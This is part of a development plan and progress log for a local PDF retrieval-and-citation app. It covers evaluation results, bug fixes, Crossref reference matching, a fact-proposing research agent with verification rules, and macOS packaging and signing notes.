      copy the supporting words exactly from that passage. The phrase is verified like any
      quote; if it isn't in the passage, nothing changes.
    - The UI and CLI mark such quotes as *re-selected*.
  - **Strict mode (off by default, Settings):** one structured-output request (JSON schema
    via Ollama `format`) judges each cited passage yes / partial / no against its sentence.
    A "no" shows as ✗ and doesn't count towards "supported".
  - **Bug found by the eval:** citation claims were cut at any ".", so "…was 65.2 years [S1]"
    yielded the claim "2 years" (also with "120.5", "U.S."). That wrecked strict-mode
    verdicts and weakened quote repair. Claims now use Unicode sentence boundaries.
  - **Eval set grown to 33 questions** (26 answerable, 7 unanswerable, including table
    lookups). Results with `qwen3.5:4b`:

    | Setting | Supported | Refused (unanswerable) | Quotes verified | Re-selected | Rejected by strict |
    |---------|-----------|------------------------|-----------------|-------------|--------------------|
    | No repair | 96% | 100% | 80% | — | — |
    | **Repair (default)** | **100%** | 100% | **97%** | 10% | — |
    | Repair + strict | 92% | 100% | 94% | 12% | 9% |

    Citation precision was 100% throughout. Strict mode's rejections after the fix were mostly
    real: a hedged "not enough information" answer that still cited a source, and a
    percentage attributed to the wrong population. It costs one extra request per answer, so
    it stays opt-in.
  - **Chunk size:** 350 / 500 / 700 tokens gave page recall@5 of 88% / **92%** / 88% (@10:
    100% / 100% / 92%), so 500 stays.
  - **Similarity gate:** stays at 0.45; it only separates off-topic questions. The new
    on-topic unanswerables score up to 0.75, above the lowest answerable (0.58), so refusals
    rest on the model's `INSUFFICIENT:`, which held at 100%.
  - **Cross-file embedding batching:** measured and reverted (see above).
  - **Seen, for later:** reference-list chunks ("12. Conroy, T.; …") rank fairly high in
    search. Detecting References sections and down-weighting them would clean up results.
    (Done below: they're now removed from the body.)
  - 67 tests pass.

- **Done (2026-11-01): bibliographies and references** (§7.1)
  - On the three test papers: 33 + 29 + 42 = 104 entries; **82 matched on Crossref**, 22
    stubs (reports, books, conference abstracts). Baicry 2021's reference 1 links to Parry
    2011 in the corpus. Chunks went from 75 to 62, and only the 6 chunks that had held
    reference text were re-embedded.
  - No reference passages in search results any more. Page recall@5 went from 92% to 88%:
    "Who funded the study?" fell from rank 3 to 10 because its acknowledgments chunk had been
    padded with reference text. Two other questions ranked better.
  - **Bug fixed:** reindexing a document overwrote its Crossref metadata with the PDF's own
    (so `metadata_source` went back to `pdf`). Manual and Crossref metadata now survive
    reprocessing; regression test added.
  - **Bug fixed:** the Documents tab lost its column layout after the Library → Documents
    rename (a stale `#tab-library` selector).
  - 77 tests pass.

- **Done (2026-11-01): Crossref cache, abstracts, reference chunks** (§7, §7.1)
  - On the three test papers, 26 of the 82 matched references have an abstract on Crossref;
    the rest don't (publishers deposit them for only some journals). All 104 references are
    embedded, which took about 30 s including the abstract lookups.
  - A second `localrag metadata` made no Crossref requests (18 ms).
  - "How does ctDNA compare with CEA as a marker of colorectal cancer recurrence?" is
    correctly unanswerable from the corpus. It now suggests van't Erve 2021, Baumgartner 2018
    and Reinert 2019 (similarity 0.58–0.65), all cited by Niemann 2024 and all on topic.
    Reinert 2019 is the closest fit.
  - 82 tests pass.

- **Done (2026-11-01): manual indexing.** The folder watcher is gone: indexing starts only
  from an upload or **Reindex** (§15), and opening a workspace doesn't sync. The flaky
  watcher-timing test went with it.

**Phase 6: packaging** (§19)
- Tauri app, bundled PDFium, first-run checks, ad-hoc signing, `.dmg` + README + licenses.

**Phase 7: reasoning agent & second brain**
- Brain files, registry, integrity checks (§13), `check` for brains.
- Second Brain tab with the Proposed Facts sidebar.
- Main column should be current accepted facts.
- Tools and agent loop; admission rules; `organize_brain` with undo.
- *Exit:* an agent run proposes facts; approved facts appear in the right model's brain;
  `organize_brain` restructures without changing any fact line; `check` is clean.
- **Done (2026-11-01):** all of the above (skipping Phase 6 for now).
  - **Code:** `core/src/brain/` (`file`, `registry`, `integrity`, `queue`, `organize`),
    `core/src/agent.rs`, `server/src/brain.rs`, the Second Brain tab, and the CLI commands
    `localrag agent "<question>" --model M` and `localrag brain show|queue|approve|reject|organize|undo`.
    `localrag check` now covers brains and the queue. Workspace config gains `reasoning_model`
    (default `qwen3.5:9b`; the Second Brain picker saves your choice there) and
    `agent_corpus_model` (unset: the reasoning model answers `ask_corpus` too).
  - **MLX vs GGUF** (Ollama, M2 16 GB, `qwen3.5:4b` vs `qwen3.5:4b-mlx`, 1,650-token prompt,
    uncached): generation 19.9 vs 20.5 tok/s (+3%), prompt processing 257 vs 211 tok/s (−18%),
    memory 3.2 vs 4.1 GB, load 3.9 vs 2.1 s; tool calls work on both. RAG prompts are long, so
    prompt processing dominates: GGUF stays the default here.
  - **Reports** (added the same day): from the UI with `qwen3.5:4b` on its 2-fact brain,
    "What determines how second primary cancers are counted in registry studies, and what do
    newer biomarkers such as ctDNA add…?" took about 6 minutes.
    - Steps: organize (reorganized), read the brain file, 3 sub-questions.
    - One sub-question wasn't answered by the corpus; the model rephrased and continued.
    - The result is a title and 4 paragraphs with 12 Baicry/Niemann citations. None failed
      to resolve, and no facts were proposed.
    - It didn't cite its two facts directly; it re-asked the corpus instead.
  - **Report tab and revised prompt** (same day): "What does ctDNA add to monitoring treatment
    response in colorectal cancer?" with the same 2-fact brain.
    - It opened from F-0002, cited directly as `[F2]`, and asked just one sub-question for what
      the fact left open.
    - The unrelated synchronous-cancer fact was left out.
    - The result is 4 connected paragraphs; every citation resolved.
  - **Tool calling:** Ollama `tools`. `ask_corpus` runs the full grounded pipeline (§10) and
    numbers each answer's citations `C1, C2, …` for the run, showing the quote and whether it
    verified. Only verified citations can support a proposal. The final answer cites `[C#]` or
    `[F#]`: each is replaced by its original source label (a fact by its citations), and any
    other marker (`[C9]`, a leftover `[S1]`) is listed as not resolving. Runs are kept in
    `agent_runs`.
  - **Admission, as built:**
    - **1:** quotes re-verified in the current chunk, then the strict judge must say "yes" for
      at least one passage and "no" for none.
    - **3:** the closed-book probe asks the brain's model the *sub-question* the citations
      came from (no sources), then a judge compares its answer with the claim.
    - **4:** rejected claims are compared by embedding, at ≥ 0.92.
    - **5:** active facts at ≥ 0.92 make the proposal a merge.
    - **6:** facts at ≥ 0.75 are checked for contradiction, and linked on approval.
    - The thresholds are first guesses: calibrate as brains grow.
  - **Integrity, as built:** checks run on every read of a brain (API, `read_brain`, organize,
    `check`), which is cheap enough that no separate post-sync pass was needed. A hand-edited
    fact line whose quotes still verify is accepted and re-registered; otherwise excluded.
    `organize_brain` refuses to run while a fact is unresolved or a line invalid, so every fact
    can be placed.
  - **Real run** (`qwen3.5:4b` both as reasoning and corpus model, scratch workspace):
    - "How long after a first cancer is a second cancer considered synchronous…?" took
      2.5 min: 2 sub-questions, 1 proposal (2 Baicry quotes), queued and approved as F-0001.
    - From the UI, a ctDNA question: the first proposal was **dropped** because its quote
      didn't verify; a second, verified one was queued, approved as F-0002.
    - **Organize** grouped the two facts under topic headings with `[THOUGHT]` lines, on the
      first attempt. The diff showed only moves; **Undo** restored it; `check` was clean.
  - 88 tests pass: file round-trips and escapes; registry; admission rules (unverified quote,
    already known, merge, conflict link, rejected, tombstone, IDs never reused); integrity
    (hand edits, unknown/duplicate/missing/deleted IDs, dangling thoughts, stale after removal
    and back); organize (byte-identical fact lines, invalid layouts refused, one retry, undo);
    an end-to-end agent run with a scripted model; brain routes need the token and refuse a
    stale `If-Match` (409).

**Later**
- Bibliography export.
- Vision-model OCR for hard pages; reranker.
- An MCP server exposing `search` / `ask`.

## 19. Packaging & distribution

- **Build:** `aarch64-apple-darwin` only. Tauri 2 bundles the UI, the in-process server, the
  `localrag-pdf` helper (next to the main executable) and `libpdfium.dylib` (in
  `Contents/Frameworks`) into a `.app` inside a `.dmg`.
- **First-run checks:**
  - Is Ollama installed and running? If not, link to the installer.
  - Is `qwen3-embedding:0.6b` present? If not, pull it via `/api/pull` with progress.
  - Pick the default `num_ctx` from RAM.
  - Ask for the Crossref email.
- **Ad-hoc signing:** Apple Silicon won't run code with no signature at all, so the app and
  every bundled library get an ad-hoc signature. Use Tauri's `signingIdentity: "-"` or
  `codesign --force --deep --sign - localrag.app`, and verify with
  `codesign --verify --deep --strict`.
- **Gatekeeper (not notarized):** the first launch of a downloaded copy is blocked, and
  right-click → Open no longer gets around this. Colleagues either:
  1. open the app once, then go to **System Settings → Privacy & Security → Open Anyway**, or
  2. run `xattr -dr com.apple.quarantine /Applications/localrag.app`.

  A README in the `.dmg` explains both.
- **Updates:** no auto-updater. Each release is a new `.dmg` needing the same one-time
  approval. An in-app notice that a newer build exists is fine.
- **Permissions:** keep them minimal. The app needs network access to localhost (Ollama) and
  Crossref, and file access to the workspace you pick.

## 20. Development environment (this machine)

- Apple M2, 16 GB; Rust (cargo) installed; this folder is its own git repo.
- Ollama 0.32.15.
  - Chat models: `qwen3.5:{0.8b,4b,9b}` (+ MLX), `deepseek-r1:8b`, `llama3.2`, `ornith:9b`.
  - `qwen3-embedding:0.6b` is not pulled yet.
  - There's no `/api/tokenize` endpoint (404).
- Defaults here: `qwen3.5:4b` for speed and `9b` for quality, at `num_ctx` 16,384.

## 21. Open questions

None at the moment. New questions will be added here during implementation.
